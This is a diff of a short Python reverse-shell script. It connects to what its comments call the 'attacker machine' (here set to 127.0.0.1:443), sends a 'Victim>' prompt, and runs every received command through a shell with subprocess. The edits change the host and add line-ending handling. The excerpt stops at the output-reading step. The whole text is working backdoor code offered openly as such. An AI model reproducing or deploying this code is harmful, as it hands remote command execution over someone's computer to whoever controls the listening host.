@@ -1,20 +1,20 @@
 
 import socket,subprocess,sys
-HOST = ''    # The remote host
+HOST = '127.0.0.1'    # The remote host
 PORT = 443            # The same port as used by the server
 if HOST and PORT:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # connect to attacker machine
     s.connect((HOST, PORT))
     # send we are connected
-    s.send('[*] Connection Established!')
+    s.send('[*] Connection Established!\r\n')
     # start loop
     while True:
         s.send("Victim>")
         # recieve shell command
         data = s.recv(1024)
         # if its quit, then break out and close socket
-        if data == "quit": break
+        if data == "quit\r\n": break
         # do shell command
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         # read output
